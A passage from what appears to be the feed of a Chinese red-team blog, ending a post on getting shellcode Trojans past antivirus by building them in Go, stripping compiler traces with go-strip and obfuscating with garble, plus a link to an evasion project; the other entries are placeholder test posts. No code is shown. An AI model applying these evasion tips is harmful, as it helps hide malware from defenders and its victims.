<p>原理在这不做过多阐述，大概就是利用windows自带的接口进行相关操作。最后结果图</p>
<figure data-type="image" tabindex="3"><img src="https://redteamblog.icu/post-images/1650697694881.png" alt="" loading="lazy"></figure>
<h3 id="4常见的shellcode免杀"><strong>4.常见的shellcode免杀</strong></h3>
<p>对于一个web手来说，让我们手写shellcode来bypass杀软有点过分，所以或多或少需要借助已有轮子，这里推荐大家用go来生成相关的木马。</p>
<p>对于go生成的木马特征不是很明显，不过还是容易被识别出来，所以我们需要借助混淆、清除特征来进行隐藏。</p>
<p>对于已有的轮子推荐</p>
<p>go-strip：用来清除go编译的特征以及函数名混淆（当然，go编译的参数也可以进行初步特征清除</p>
<p>garble：很多人使用（在go编译的时候就会进行字节码、函数相关的混淆，过火绒应该还是没问题</p>
<p><strong>web手的进一步免杀工程</strong></p>
<p>通过研究已有项目进行免杀</p>
<pre><code>https://github.com/safe6Sec/GolangBypassAV
</code></pre>
<p>常见的是静态免杀，比如隐藏图片，分离，核心都一样，隐藏特征</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[test312131]]></title>
        <id>https://redteamblog.icu/post/test312131/</id>
        <link href="https://redteamblog.icu/post/test312131/">
        </link>
        <updated>2022-04-23T03:52:31.000Z</updated>
        <content type="html"><![CDATA[<p>231312313</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[多级目录测试]]></title>
        <id>https://redteamblog.icu/post/duo-ji-mu-lu-ce-shi/</id>
        <link href="https://redteamblog.icu/post/duo-ji-mu-lu-ce-shi/">
        </link>
        <updated>2022-04-22T20:17:54.000Z</updated>
        <content type="html"><![CDATA[<p>weqweqq</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[test]]></title>
        <id>https://redteamblog.icu/post/suibi2/</id>
        <link href="https://redteamblog.icu/post/suibi2/">
        </link>
        <updated>2022-04-22T20:15:54.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<p>1231</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[这是另外一篇随笔的测试]]></title>
        <id>https://redteamblog.icu/post/suibi/</id>
        <link href="https://redteamblog.icu/post/suibi/">
        </link>
        <updated>2022-04-22T20:13:37.000Z</updated>
        <content type="html"><![CDATA[<p>这是另外一篇随笔的测试</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[这是一篇测试内容]]></title>
        <id>https://redteamblog.icu/post/test/</id>
        <link href="https://redteamblog.icu/post/test/">
        </link>
        <updated>2022-04-22T19:06:44.000Z</updated>
        <content type="html"><![CDATA[<p>test</p>
]]></content>
    </entry>
</feed>